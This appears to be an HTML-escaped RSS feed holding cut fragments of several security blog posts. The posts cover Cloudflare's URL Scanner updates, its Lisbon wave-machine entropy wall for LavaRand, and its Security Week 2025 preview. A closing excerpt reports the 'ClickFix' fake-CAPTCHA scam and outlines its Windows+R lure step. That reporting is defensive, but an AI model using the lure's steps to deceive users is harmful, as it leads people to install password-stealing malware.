          &lt;/figure&gt;&lt;p&gt;In this workflow, when the user submits a new scan, we create a &lt;a href="https://developers.cloudflare.com/durable-objects/"&gt;&lt;u&gt;Durable Object&lt;/u&gt;&lt;/a&gt; with the same ID as the scan, save the scan options, like the URL to scan, to the &lt;a href="https://developers.cloudflare.com/durable-objects/api/storage-api/"&gt;&lt;u&gt;Durable Objects’s storage&lt;/u&gt;&lt;/a&gt; and schedule an &lt;a href="https://developers.cloudflare.com/durable-objects/api/storage-api/#setalarm"&gt;&lt;u&gt;alarm&lt;/u&gt;&lt;/a&gt; for a few seconds later. This allows us to respond immediately to the user, signalling a successful submission. A few seconds later the alarm triggers, and we start the scan itself. &lt;/p&gt;&lt;p&gt;However, with bulk scanning, the process is slightly different:&lt;/p&gt;
          &lt;figure&gt;
          &lt;img src="https://cf-assets.www.cloudflare.com/zkvhlag99gkb/2kXLJ5sSGBbM06H3Ftsrqi/a4440fd0efc7c0271580c6da6f08f814/image9.png" /&gt;
          &lt;/figure&gt;&lt;p&gt;In this case, there are no Durable Objects involved just yet; the system simply sends each URL in the bulk scan submission as a new message to the queue.&lt;/p&gt;&lt;p&gt;Notice that in both of these cases the scan is triggered asynchronously. In the first case, it starts when the Durable Objects alarm fires and, in the second case, when messages in the queue are consumed. While the durable object alarm will always fire in a few seconds, messages in the queue have no predetermined processing time, they may be processed seconds to minutes later, depending on how many messages are already in the queue and how fast the system processes them.&lt;/p&gt;&lt;p&gt;When users bulk scan, having the scan done at &lt;i&gt;some &lt;/i&gt;point in time is more important than having it done &lt;i&gt;now&lt;/i&gt;. When using the regular scan workflow, users are limited in the number of scans per minute they can submit. However, when using bulk scan this is not a concern, and users can simply send all URLs they want to process in a single HTTP request. This comes with the tradeoff that scans may take longer to complete, which is a perfect fit for &lt;a href="https://developers.cloudflare.com/queues/"&gt;&lt;u&gt;Cloudflare Queues&lt;/u&gt;&lt;/a&gt;. Having the ability to &lt;a href="https://developers.cloudflare.com/queues/configuration/configure-queues/#consumer-worker-configuration"&gt;&lt;u&gt;configure&lt;/u&gt;&lt;/a&gt; retries, max batch size, max batch timeouts, and max concurrency is something we’ve found very useful. As the scans are completed asynchronously, users can request the resulting scan reports &lt;a href="https://developers.cloudflare.com/api/resources/url_scanner/subresources/scans/methods/get/"&gt;&lt;u&gt;via the API&lt;/u&gt;&lt;/a&gt;.&lt;/p&gt;&lt;h4&gt;Discover related scans and better IOC search&lt;/h4&gt;&lt;p&gt;The &lt;i&gt;Related Scans&lt;/i&gt; feature allows &lt;a href="https://developers.cloudflare.com/api/resources/url_scanner/subresources/scans/methods/list/"&gt;&lt;u&gt;API&lt;/u&gt;&lt;/a&gt;, &lt;a href="http://dash.cloudflare.com"&gt;&lt;u&gt;Cloudflare dashboard&lt;/u&gt;&lt;/a&gt; and &lt;a href="http://radar.cloudflare.com"&gt;&lt;u&gt;Radar&lt;/u&gt;&lt;/a&gt; users alike to view related scans directly within the URL Scanner Report. This helps users analyze and understand the context of a scanned URL by providing insights into similar URLs based on various attributes. Filter and search through URL Scanner reports to retrieve information on related scans, including those with identical favicons, similar HTML structures, and matching IP addresses.&lt;/p&gt;&lt;p&gt;The &lt;i&gt;Related Scans&lt;/i&gt; tab presents a table with key headers corresponding to four distinct filters. Each entry includes the scanned URL and a direct link to view the detailed scan report, allowing for quick access to further information. &lt;/p&gt;
          &lt;figure&gt;
          &lt;img src="https://cf-assets.www.cloudflare.com/zkvhlag99gkb/6yRzKVd0M9sNF1uGOWA1vb/212008b5296ad6df23088571f0602930/image3.png" /&gt;
          &lt;/figure&gt;&lt;p&gt;We've introduced the ability to search by indicators of compromise (IOCs), such as IP addresses and hashes, directly within the user interface. Additionally, we've added advanced filtering options by various criteria, including screenshots, hashes, favicons, and HTML body content. This allows for more efficient organization and prioritization of URLs based on specific needs. While attackers often make minor modifications to the HTML structure of phishing pages to evade detection, our advanced filtering options enable users to search for URLs with similar HTML content. This means that even if the visual appearance of a phishing page changes slightly, we can still identify connections to known phishing campaigns by comparing the underlying HTML structure. This proactive approach helps users identify and block these threats effectively.&lt;/p&gt;&lt;p&gt;Another use case for the advanced filtering options is the search by hash; a user who has identified a malicious JavaScript file through a previous investigation can now search using the file's hash. By clicking on an HTTP transaction, you'll find a direct link to the relevant hash, immediately allowing you to pivot your investigation. The real benefit comes from identifying other potentially malicious sites that have that same hash. This means that if you know a given script is bad, you can quickly uncover other compromised websites delivering the same malware.&lt;/p&gt;
          &lt;figure&gt;
          &lt;img src="https://cf-assets.www.cloudflare.com/zkvhlag99gkb/3rWKgTrGLW297cVFbH9hSY/4555697b668d90f3df4d740bd91d3116/image7.png" /&gt;
          &lt;/figure&gt;&lt;p&gt;The user interface has also undergone significant improvements to enhance the overall experience. Other key updates include:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;p&gt;Page title and favicon surfaced, providing immediate visual context&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;Detailed summaries are now available&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;Redirect chains allow users to understand the navigation path of a URL&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;The ability to scan files from URLs that trigger an automatic file download&lt;/p&gt;&lt;/li&gt;&lt;/ul&gt;
          &lt;figure&gt;
          &lt;img src="https://cf-assets.www.cloudflare.com/zkvhlag99gkb/5O55W8CLMrlPANpzkPAUY0/35748cb200feb79de6251c79d2be87f9/image2.png" /&gt;
          &lt;/figure&gt;&lt;h4&gt;Download HAR files&lt;/h4&gt;&lt;p&gt;With the latest updates to our URL Scanner, users can now download both the &lt;a href="https://en.wikipedia.org/wiki/HAR_(file_format)"&gt;&lt;u&gt;HAR (HTTP Archive) file&lt;/u&gt;&lt;/a&gt; and the JSON report from their scans. The &lt;a href="https://blog.cloudflare.com/introducing-har-sanitizer-secure-har-sharing/"&gt;&lt;u&gt;HAR file&lt;/u&gt;&lt;/a&gt; provides a detailed record of all interactions between the web browser and the scanned website, capturing crucial data such as request and response headers, timings, and status codes. This format is widely recognized in the industry and can be easily analyzed using various tools, making it invaluable for developers and security analysts alike.&lt;/p&gt;&lt;p&gt;For instance, a threat intelligence analyst investigating a suspicious URL can download the HAR file to examine the network requests made during the scan. By analyzing this data, they can identify potential malicious behavior, such as unexpected redirects and correlate these findings with other threat intelligence sources. Meanwhile, the JSON report offers a structured overview of the scan results, including security verdicts and associated IOCs, which can be integrated into broader security workflows or automated systems.&lt;/p&gt;&lt;h4&gt;New API version&lt;/h4&gt;&lt;p&gt;Finally, we’re announcing a &lt;a href="https://developers.cloudflare.com/api/operations/urlscanner-create-scan-v2"&gt;&lt;u&gt;new version of our API&lt;/u&gt;&lt;/a&gt;, allowing users to transition effortlessly to our service without needing to overhaul their existing workflows. Moving forward, any future features will be integrated into this updated API version, ensuring that users have access to the latest advancements in our URL scanning technology.&lt;/p&gt;&lt;p&gt;We understand that many organizations rely on automation and integrations with our previous API version.

In March 2025, we added another layer to its legacy: a "wall of entropy" made of 50 &lt;b&gt;wave machines &lt;/b&gt;in constant motion at our Lisbon office, the company's European HQ. &lt;/p&gt;&lt;p&gt;These wave machines are a new source of entropy, joining &lt;b&gt;lava lamps&lt;/b&gt; in San Francisco, &lt;b&gt;suspended rainbows&lt;/b&gt; in Austin, and &lt;b&gt;double chaotic pendulums &lt;/b&gt;in London. The entropy they generate contributes to securing the Internet &lt;a href="https://blog.cloudflare.com/tag/security/rss#lavarand-origins-and-walls-of-entropy"&gt;&lt;u&gt;through LavaRand&lt;/u&gt;&lt;/a&gt;.&lt;/p&gt;

          &lt;/figure&gt;&lt;p&gt;&lt;sup&gt;&lt;i&gt;The new waves wall at Cloudflare’s Lisbon office sits beside the Radar Display of global Internet insights, with the 25th of April Bridge overlooking the Tagus River in the background.&lt;/i&gt;&lt;/sup&gt;&lt;/p&gt;&lt;p&gt;It’s exciting to see waves in Portugal now playing a role in keeping the Internet secure, especially given Portugal’s deep maritime history.&lt;/p&gt;&lt;p&gt;The installation honors Portugal’s passion for the sea and exploration of the unknown, famously beginning over 600 years ago, in 1415, with pioneering vessels like &lt;a href="https://en.wikipedia.org/wiki/Caravel"&gt;&lt;u&gt;caravels&lt;/u&gt;&lt;/a&gt; and naus/carracks, precursors to galleons and other ships. Portuguese sea exploration was driven by navigation schools and historic voyages &lt;i&gt;“through seas never sailed before”&lt;/i&gt; (&lt;i&gt;“Por mares nunca dantes navegados” &lt;/i&gt;in Portuguese), as described by Portugal’s famous poet, Luís Vaz de Camões, born 500 years ago (1524).&lt;/p&gt;&lt;p&gt;Anyone familiar with Portugal knows the &lt;a href="https://en.wikipedia.org/wiki/History_of_Portugal#Naval_exploration_and_Portuguese_Empire_(15th%E2%80%9316th_centuries)"&gt;&lt;u&gt;sea is central&lt;/u&gt;&lt;/a&gt; to its identity. The small country has 980 km of coastline, where most of its main cities are located. Maritime areas make up 90% of its territory, including the mid-Atlantic Azores. In 1998, Lisbon’s &lt;a href="https://en.wikipedia.org/wiki/Expo_%2798"&gt;&lt;u&gt;Expo 98&lt;/u&gt;&lt;/a&gt; celebrated the oceans and this maritime heritage. Since 2011, the small town of Nazaré also became globally &lt;a href="https://allwaves.surf/waves-explained-nazare/"&gt;&lt;u&gt;famous among the surfing community&lt;/u&gt;&lt;/a&gt; for its &lt;a href="https://earthobservatory.nasa.gov/images/149486/monster-waves-of-nazare"&gt;&lt;u&gt;giant waves&lt;/u&gt;&lt;/a&gt;.&lt;/p&gt;

Photos: Sam Khawasé &amp;amp; Beatriz Paula, from Cloudflare.&lt;/i&gt;&lt;/sup&gt;&lt;/p&gt;&lt;p&gt;Portugal’s maritime culture also inspired literature and music, including poet Fernando Pessoa, who referenced it in his 1934 book &lt;a href="https://en.wikipedia.org/wiki/Mensagem"&gt;&lt;u&gt;Mensagem&lt;/u&gt;&lt;/a&gt;, and musician Rui Veloso, who dedicated his 1990s album &lt;a href="https://open.spotify.com/album/2mzMuD3bxwFaFgfjU2vigY"&gt;&lt;u&gt;Auto da Pimenta&lt;/u&gt;&lt;/a&gt; to Portugal’s historic connection to the sea.&lt;/p&gt;
          &lt;div&gt;
            &lt;h3&gt;How this chaos came to be&lt;/h3&gt;
            &lt;a href="https://blog.cloudflare.com/tag/security/rss#how-this-chaos-came-to-be"&gt;
              
            &lt;/a&gt;
          &lt;/div&gt;
        &lt;p&gt;As Cloudflare’s CEO, Matthew Prince, &lt;a href="https://x.com/eastdakota/status/1899226252956827846"&gt;&lt;u&gt;said&lt;/u&gt;&lt;/a&gt; recently, this new wall of entropy began with an idea back in 2023: “What could we use for randomness that was like our lava lamp wall in San Francisco but represented our team in Portugal?”&lt;/p&gt;&lt;p&gt;The original inspiration came from wave motion machine desk toys, which were popular among some of our team members. Waves and the ocean not only provide a source of movement and randomness, but also align with Portugal’s maritime history and the office’s scenic view.&lt;/p&gt;&lt;p&gt;However, this was easier said than done. It turns out that making a wave machine wall is a real challenge, given that these toys are not as popular as they were in the past,  and aren’t being manufactured in the size we needed any more. We scoured eBay and other sources but couldn't find enough, consistent in style and in working order wave machines. We also discovered that off-the-shelf models weren’t designed to run 24/7, which was a critical requirement for our use.&lt;/p&gt;&lt;h4&gt;Artistry to create wave machines&lt;/h4&gt;&lt;p&gt;Undaunted, &lt;a href="https://blog.cloudflare.com/cloudflare-top-100-most-loved-workplaces-in-2022"&gt;&lt;u&gt;Cloudflare’s Places team&lt;/u&gt;&lt;/a&gt;, which ensures our offices reflect our values and culture, found a &lt;a href="https://wavemotionmachines.com/"&gt;&lt;u&gt;U.S.-based artisan&lt;/u&gt;&lt;/a&gt; that specializes in ocean wave displays to create the wave machines for us. Since 2009, his one-person business, &lt;a href="https://wavemotionmachines.com/"&gt;&lt;u&gt;Hughes Wave Motion Machines&lt;/u&gt;&lt;/a&gt;, has blended artistry, engineering, and research, following his transition from Lockheed Martin Space Systems, where he designed military and commercial satellites.&lt;/p&gt;&lt;div&gt;
  
&lt;/div&gt;
&lt;p&gt;&lt;/p&gt;&lt;p&gt;&lt;sup&gt;&lt;i&gt;Timelapse of the mesmerizing office waves, set to the tune of an AI-generated song.&lt;/i&gt;&lt;/sup&gt;&lt;/p&gt;&lt;p&gt;Collaborating closely, we developed a custom rectangular wave machine (18 inches/45 cm long) that runs nonstop — not an easy task — which required hundreds of hours of testing and many iterations. Featuring rotating wheels, continuous motors, and a unique fluid formula, these machines create realistic ocean-like waves in green, blue, and Cloudflare’s signature orange. &lt;/p&gt;&lt;p&gt;Here’s a quote from the artist himself about these wave machines:&lt;/p&gt;&lt;blockquote&gt;&lt;p&gt;&lt;i&gt;“The machine’s design is a balancing act of matching components and their placement to how the fluid responds in a given configuration. There is a complex yet delicate relationship between viscosity, specific gravity, the size and design of the vessel, and the placement of each mechanical interface. Everything must be precisely aligned, centered around the fluid like a mathematical function. I like to say it’s akin to ’balancing a checkerboard on a beach ball in the wind.’”&lt;/i&gt;&lt;/p&gt;&lt;/blockquote&gt;
          &lt;figure&gt;

        &lt;p&gt;Cloudflare’s servers handle 71 million HTTP requests per second on average, with 100 million HTTP requests per second at peak. &lt;a href="https://radar.cloudflare.com/adoption-and-usage#http-vs-https"&gt;&lt;u&gt;Most of these requests are secured via TLS&lt;/u&gt;&lt;/a&gt;, which relies on secure randomness for cryptographic integrity. A Cryptographically Secure Pseudorandom Number Generator (&lt;a href="https://www.cloudflare.com/learning/ssl/lava-lamp-encryption/"&gt;&lt;u&gt;CSPRNG&lt;/u&gt;&lt;/a&gt;) ensures unpredictability, but only when seeded with high-quality entropy. Since chaotic movement in the real world is truly random, Cloudflare designed a system to harness it. Our &lt;a href="https://blog.cloudflare.com/harnessing-office-chaos/"&gt;&lt;u&gt;2024 blog post&lt;/u&gt;&lt;/a&gt; expands on this topic in a more technical way, but here’s a quick summary.&lt;/p&gt;&lt;p&gt;In &lt;a href="https://blog.cloudflare.com/randomness-101-lavarand-in-production/"&gt;&lt;u&gt;2017&lt;/u&gt;&lt;/a&gt;, Cloudflare launched LavaRand, inspired by &lt;a href="https://www.wired.com/1997/03/lava-lites-easy-to-break-hard-to-crack/"&gt;&lt;u&gt;Silicon Graphics’ 1997 concept&lt;/u&gt;&lt;/a&gt; However, the need for randomness in security was already a hot topic on our blog before that, such as in our discussions of &lt;a href="https://blog.cloudflare.com/why-randomness-matters/"&gt;&lt;u&gt;securing systems&lt;/u&gt;&lt;/a&gt; and &lt;a href="https://blog.cloudflare.com/a-relatively-easy-to-understand-primer-on-elliptic-curve-cryptography/"&gt;&lt;u&gt;cryptography&lt;/u&gt;&lt;/a&gt;. Originally, LavaRand collected entropy from a wall of lava lamps in our San Francisco office, feeding an internal API that servers periodically query to include in their entropy pools. Over time, we expanded LavaRand beyond lava lamps, incorporating &lt;a href="https://blog.cloudflare.com/harnessing-office-chaos/#londons-unpredictable-pendulums"&gt;&lt;u&gt;new sources of office chaos&lt;/u&gt;&lt;/a&gt; while maintaining the same core method.&lt;/p&gt;
          &lt;figure&gt;
          &lt;img src="https://cf-assets.www.cloudflare.com/zkvhlag99gkb/2v6Wvde8j8R7482QjBsSrV/89b37c652654e27c13d328e9acac6489/image9.png" /&gt;
          &lt;/figure&gt;&lt;p&gt;A camera captures images of dynamic, unpredictable randomness displays. Shadows, lighting changes, and even sensor noise contribute entropy. Each image is then processed into a compact hash, converting it into a sequence of random bytes. These, combined with the previous seed and local system entropy, serve as input for a Key Derivation Function (&lt;a href="https://en.wikipedia.org/wiki/Key_derivation_function"&gt;&lt;u&gt;KDF&lt;/u&gt;&lt;/a&gt;), which generates a new seed for a CSPRNG — capable of producing virtually unlimited random bytes upon request. The waves in our Lisbon office are now contributing to this pool of randomness.&lt;/p&gt;
          &lt;figure&gt;
          &lt;img src="https://cf-assets.www.cloudflare.com/zkvhlag99gkb/1XFFjr4jhRMQlz6akHKZm4/44759c4e879de3792cd21b4ce2525c90/image5.png" /&gt;
          &lt;/figure&gt;&lt;p&gt;Cloudflare’s LavaRand API makes this randomness accessible internally, strengthening cryptographic security across our global infrastructure. For example, when you use &lt;i&gt;Math.random()&lt;/i&gt; in &lt;a href="https://workers.cloudflare.com/"&gt;&lt;u&gt;Cloudflare Workers&lt;/u&gt;&lt;/a&gt;, part of that randomness comes from LavaRand. Similarly, querying our &lt;a href="https://blog.cloudflare.com/harnessing-office-chaos/#drand-distributed-and-verifiable-public-randomness"&gt;&lt;u&gt;drand API&lt;/u&gt;&lt;/a&gt; taps into LavaRand as well. Cloudflare offers this API to enable anyone to generate random numbers and even seed their own systems.&lt;/p&gt;
          &lt;div&gt;
            &lt;h3&gt;Our new Lisbon office space&lt;/h3&gt;
            &lt;a href="https://blog.cloudflare.com/tag/security/rss#our-new-lisbon-office-space"&gt;
              
            &lt;/a&gt;
          &lt;/div&gt;
        
          &lt;figure&gt;
          &lt;img src="https://cf-assets.www.cloudflare.com/zkvhlag99gkb/5ivPkCfTkGxfo6Swt6p9qY/e7414a14b88bef7ac7e0ef6f737b58c6/image8.jpg" /&gt;
          &lt;/figure&gt;&lt;p&gt;&lt;sup&gt;&lt;i&gt;Photo of the view from our Lisbon office, featuring ceiling lights arranged in a wave-like pattern.&lt;/i&gt;&lt;/sup&gt;&lt;/p&gt;&lt;p&gt;Entropy also inspired the design ethos of our new Lisbon office, given that the wall of waves and the office are part of the same project. As soon as you enter, you're greeted not only by the motion of the entropy wall but also by the constant movement of planet Earth on our Cloudflare Radar Display screen that stands next to it. But the waves don’t stop there — more elements throughout the space mimic the dynamic flow of the Internet itself. Unlike ocean tides, however, Internet traffic ebbs and flows with the motion of the Sun, not the Moon.&lt;/p&gt;&lt;p&gt;As you walk through the office, waves are everywhere — in the ceiling lights, the architectural contours, and even the floor plan, thoughtfully designed by our architect to reflect the fluid movement of water. The visual elements create a cohesive experience, reinforcing a sense of motion. Each meeting room embraces this maritime theme, named after famous Portuguese beaches — including, naturally, Nazaré.&lt;/p&gt;&lt;p&gt;We partnered with an incredible group of local Portuguese vendors for this construction project, where all the leads were women — something incredibly rare for the industry. The local teams worked with passion, proudly wore Cloudflare t-shirts, and fostered a warm, family-like atmosphere. They openly expressed pride in the project, sharing how it stood out from anything they had worked on before.&lt;/p&gt;
          &lt;figure&gt;
          &lt;img src="https://cf-assets.www.cloudflare.com/zkvhlag99gkb/7lpuurEtWfpIPKvHVqmD0L/0b0561097859f286d6b5e98db82f1e0f/image3.jpg" /&gt;
          &lt;/figure&gt;&lt;p&gt;&lt;sup&gt;&lt;i&gt;Our amazing third-party team and internal Places team, proudly rocking Cloudflare shirts after bringing this project to life.&lt;/i&gt;&lt;/sup&gt;&lt;/p&gt;

Welcome to Security Week 2025!</description><content:encoded>&lt;p&gt;The layer of security around today’s Internet is essential to safeguarding everything. From the way we shop online, engage with our communities, access critical healthcare resources, sustain the worldwide digital economy, and beyond. Our dependence on the Internet has led to cyber attacks that are bigger and more widespread than ever, worsening the so-called defender’s dilemma: attackers only need to succeed once, while defenders must succeed every time.&lt;/p&gt;&lt;p&gt;In the past year alone, we &lt;a href="https://blog.cloudflare.com/ddos-threat-report-for-2024-q4/"&gt;&lt;u&gt;discovered and mitigated the largest DDoS attack&lt;/u&gt;&lt;/a&gt; ever recorded in the history of the Internet – three different times – underscoring the rapid and persistent efforts of threat actors. We helped &lt;a href="https://blog.cloudflare.com/elections-2024-internet/"&gt;&lt;u&gt;safeguard the largest year of elections&lt;/u&gt;&lt;/a&gt; across the globe, with more than half the world’s population eligible to vote, all while witnessing geopolitical tensions and war reflected in the digital world.&lt;/p&gt;&lt;p&gt;2025 already promises to follow suit, with cyberattacks estimated to cost the global economy $10.5 trillion in 2025. As the rapid advancement of &lt;a href="https://x.com/i/grok?text=AI%20advancements"&gt;AI&lt;/a&gt; and emerging technologies increases, and as threat actors become more agile and creative, the security landscape continues to drastically evolve. Organizations now face a higher volume of attacks, and an influx of more complex threats that carry real-world consequences, such as state-sponsored cyber attacks and assaults on critical infrastructure. &lt;/p&gt;&lt;p&gt;My job is to protect Cloudflare as an organization and support our customers in staying one step ahead of threat actors. While every week is a security week at Cloudflare, it’s time to ship — that’s what Innovation Weeks are all about! Welcome to Security Week 2025.&lt;/p&gt;
          &lt;div&gt;
            &lt;h2&gt;My perspective on the security landscape&lt;/h2&gt;
            &lt;a href="https://blog.cloudflare.com/tag/security/rss#my-perspective-on-the-security-landscape"&gt;
              
            &lt;/a&gt;
          &lt;/div&gt;
          &lt;p&gt;As CSO, I have the privilege of collaborating with world-class security leaders who are navigating the dynamic threat and regulatory landscape. Through meaningful exchanges at forums like the World Economic Forum at Davos, RSA, and Black Hat, I've gained useful perspectives on the shared difficulties we encounter while handling today’s security needs:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;p&gt;&lt;b&gt;Complexity: &lt;/b&gt;Complexity has become the enemy of security. Teams are struggling with fragmented technology stacks, multi-cloud environments and continued gaps in security talent. Situational awareness is limited, disparate systems increase operational overhead, and the ability to modernize becomes daunting.&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;&lt;b&gt;Artificial Intelligence: &lt;/b&gt;AI presents both opportunity and risk. Organizations are racing to leverage AI faster than they can train their workforce on how to mitigate the unique risks it introduces. Security teams are being asked to secure AI models to protect sensitive data and support operational stability, all on constrained budgets and resources.&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;&lt;b&gt;Security blind spots: &lt;/b&gt;The attack surface continues to expand. With remote work, cloud migration, and the acceleration of digital transformation, security teams struggle to maintain visibility across increasingly distributed environments. This expansion has created blind spots that sophisticated threat actors are quick to exploit.&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;&lt;b&gt;Trusted vendors: &lt;/b&gt;Supply chain security incidents increase year over year. Recent high-profile incidents have demonstrated how vulnerabilities in third-party components can cascade through the digital ecosystem. Security teams must account for risks far beyond their immediate perimeter, extending to every dependency in their technology stack.&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;&lt;b&gt;Detection velocity: &lt;/b&gt;The time it takes to detect a threat actor in your environment remains too long. Despite investments in monitoring and detection technologies, the average dwell time for attackers still exceeds industry targets. Security leaders express frustration that sophisticated adversaries can operate undetected within networks for extended periods of time.&lt;/p&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;What's clear across the security community is that the traditional approach of layering point solutions is not sustainable. Security leaders need integrated platforms that reduce complexity while providing comprehensive protection and visibility. This is precisely &lt;a href="https://blog.cloudflare.com/why-i-joined-cloudflare-as-chief-security-officer/"&gt;&lt;u&gt;why I joined Cloudflare nearly two years ago&lt;/u&gt;&lt;/a&gt; — to help build innovative solutions for today’s threat landscape and the future, not the threat landscape from five years ago.&lt;/p&gt;
          &lt;div&gt;
            &lt;h2&gt;Security Week priorities in 2025&lt;/h2&gt;
            &lt;a href="https://blog.cloudflare.com/tag/security/rss#security-week-priorities-in-2025"&gt;
              
            &lt;/a&gt;
          &lt;/div&gt;
          &lt;p&gt;Over the following week we will showcase innovation that will help security practitioners solve the challenges faced every day. As leader of the security organization at Cloudflare, and Customer Zero, our team has influenced the product updates launching this week.&lt;/p&gt;&lt;p&gt;Here is a preview of what you can expect this week:&lt;/p&gt;
          &lt;div&gt;
            &lt;h3&gt;Securing the post-quantum world&lt;/h3&gt;
            &lt;a href="https://blog.cloudflare.com/tag/security/rss#securing-the-post-quantum-world"&gt;
              
            &lt;/a&gt;
          &lt;/div&gt;
        &lt;p&gt;Quantum computing will change the face of Internet security forever — particularly in the realm of cryptography, which is the way communications and information are secured across channels like the Internet.&lt;/p&gt;&lt;p&gt;As quantum computing continues to mature, research and development efforts in cryptography are keeping pace. We’re optimistic that collaborative efforts among NIST, Microsoft, Cloudflare, and other computing companies will yield a robust, standards-based solution. &lt;/p&gt;&lt;p&gt;Cloudflare will announce advancements to its cloud-native &lt;a href="https://blog.cloudflare.com/tag/post-quantum/"&gt;&lt;u&gt;quantum-safe&lt;/u&gt;&lt;/a&gt; zero trust solution, the first of its kind. This ensures future-proof security for corporate network traffic in an easily adoptable way for our customers. The updates shared by our product team will redefine how businesses and individuals navigate our evolving post-quantum landscape.&lt;/p&gt;
          &lt;figure&gt;
          &lt;img src="https://cf-assets.www.cloudflare.com/zkvhlag99gkb/1VEhsmtQf722vc2NJTVRco/cf5127478d25ca87d38b2bbb501f86db/unnamed.png" /&gt;
          &lt;/figure&gt;
          &lt;div&gt;
            &lt;h3&gt;Contextualizing threats on the network that blocks the most attacks &lt;/h3&gt;
            &lt;a href="https://blog.cloudflare.com/tag/security/rss#contextualizing-threats-on-the-network-that-blocks-the-most-attacks"&gt;
              
            &lt;/a&gt;
          &lt;/div&gt;
        &lt;p&gt;Effective security programs need to stay two steps ahead of emerging threats. Threat intelligence available to most security teams comes without context, making it challenging to react accordingly. &lt;/p&gt;&lt;p&gt;This week, we’re launching our threat events platform, providing our customers real-time cyber threat intelligence data. By leveraging our network footprint, customers will have a comprehensive view of cyber threats based on attacks occurring across the Internet. &lt;/p&gt;&lt;p&gt;This product will enable users to self-serve with contextual insights into attacks occurring on the Internet, enhancing their ability to proactively adjust defenses and respond to emerging threats. As security practitioners, stopping threats at the gate isn’t enough — we need to be ahead of the next vector. The Threat Events feed provides that additional layer of forensic analysis to give us that edge — dissecting the who, how, and why behind each attack. It’s like performing an autopsy on the threats we neutralize, revealing patterns, tactics, and potential weaknesses in our defenses that raw data alone might miss.&lt;/p&gt;
          &lt;div&gt;
            &lt;h3&gt;Stopping threats at the edge with AI&lt;/h3&gt;
            &lt;a href="https://blog.cloudflare.com/tag/security/rss#stopping-threats-at-the-edge-with-ai"&gt;
              
            &lt;/a&gt;
          &lt;/div&gt;
        &lt;p&gt;No surprise, AI is still the number one topic of discussion. AI is a common theme across all industries, with a core concern of how to secure and protect our investments. As a leader in providing infrastructure for AI training and inference, our engineering and product teams have been working hard on building a way to protect our own, and our customers', AI models, data, and applications.&lt;/p&gt;&lt;p&gt;This week, our product team will share how our users can gain greater control over their data with our new Firewall for AI and improved capabilities for our related AI Gateway. As the world shifts its focus from building models to actively deploying them, you need to protect against third parties exploiting your data to train their own generative AI systems. &lt;/p&gt;&lt;p&gt;Alongside this, we’ll provide security teams with visibility and protection across all web and enterprise applications from a single, unified platform. This new capability can pinpoint the location of all applications across your organization, understand corresponding potential threats, and provide risk reduction recommendations.&lt;/p&gt;
          &lt;figure&gt;
          &lt;img src="https://cf-assets.www.cloudflare.com/zkvhlag99gkb/5jgsJYcCabhPRnJjrdVElQ/27574287408a505782afa32a027731d5/unnamed__1_.png" /&gt;
          &lt;/figure&gt;
          &lt;div&gt;
            &lt;h3&gt;How can we help make the Internet better&lt;/h3&gt;
            &lt;a href="https://blog.cloudflare.com/tag/security/rss#how-can-we-help-make-the-internet-better"&gt;
              
            &lt;/a&gt;
          &lt;/div&gt;
        &lt;p&gt;Beyond new tools and features, Security Week 2025 represents our commitment to our mission of helping build a better Internet.&lt;/p&gt;&lt;p&gt;What sets Cloudflare apart is our unique position at the intersection of security and innovation. The solutions we're unveiling this week aren't just responses to today's threats, they're forward-looking innovations that anticipate tomorrow's challenges. They reflect our understanding that security must evolve from being reactive to predictive, from complex to intuitive, and from siloed to integrated.&lt;/p&gt;
          &lt;div&gt;
            &lt;h2&gt;Welcome to Security Week&lt;/h2&gt;
            &lt;a href="https://blog.cloudflare.com/tag/security/rss#welcome-to-security-week"&gt;
              
            &lt;/a&gt;
          &lt;/div&gt;
          &lt;p&gt;Innovation Weeks have become a cornerstone of how we connect with our community at Cloudflare. For me personally, each Security Week brings renewed energy and perspective. The conversations with customers, security practitioners, and industry leaders continuously reshapes our understanding of what's possible.&lt;/p&gt;&lt;p&gt;I invite you to engage with us throughout the week, whether through live demos, technical deep dives, or direct conversations with our team. My hope is that you'll walk away not just with new tools, but with a clearer vision of how we can collectively build a safer Internet experience for everyone.&lt;/p&gt;&lt;p&gt;The future of security isn't about building higher walls, it's about creating smarter ecosystems. Let's build that future together.&lt;/p&gt;

In this scam, dubbed &amp;#8220;&lt;strong&gt;ClickFix&lt;/strong&gt;,&amp;#8221; the visitor to a hacked or malicious website is asked to distinguish themselves from bots by pressing a combination of keyboard keys that causes &lt;strong&gt;Microsoft Windows&lt;/strong&gt; to download password-stealing malware.&lt;/p&gt;
&lt;p&gt;ClickFix attacks mimic the &amp;#8220;Verify You are a Human&amp;#8221; tests that many websites use to separate real visitors from content-scraping bots. This particular scam usually starts with a website popup that looks something like this:&lt;/p&gt;
&lt;div class="wp-caption aligncenter" id="attachment_68856" style="width: 793px;"&gt;&lt;img alt="" class="size-full wp-image-68856" height="397" src="https://krebsonsecurity.com/wp-content/uploads/2024/09/verifyhuman.png" width="783" /&gt;&lt;p class="wp-caption-text" id="caption-attachment-68856"&gt;This malware attack pretends to be a CAPTCHA intended to separate humans from bots.&lt;/p&gt;&lt;/div&gt;
&lt;p&gt;Clicking the &amp;#8220;I&amp;#8217;m not a robot&amp;#8221; button generates a pop-up message asking the user to take three sequential steps to prove their humanity.&lt;/p&gt;
&lt;div class="wp-caption aligncenter" id="attachment_70703" style="width: 634px;"&gt;&lt;img alt="" class="wp-image-70703 size-full" height="339" src="https://krebsonsecurity.com/wp-content/uploads/2025/03/verifsteps.png" width="624" /&gt;&lt;p class="wp-caption-text" id="caption-attachment-70703"&gt;Executing this series of keypresses prompts Windows to download password-stealing malware.&lt;/p&gt;&lt;/div&gt;
&lt;p&gt;Step 1 involves simultaneously pressing the keyboard key with the Windows icon and the letter &amp;#8220;R,&amp;#8221; which opens a Windows &amp;#8220;Run&amp;#8221; prompt that will execute any specified program that is already installed on the system.&lt;/p&gt;
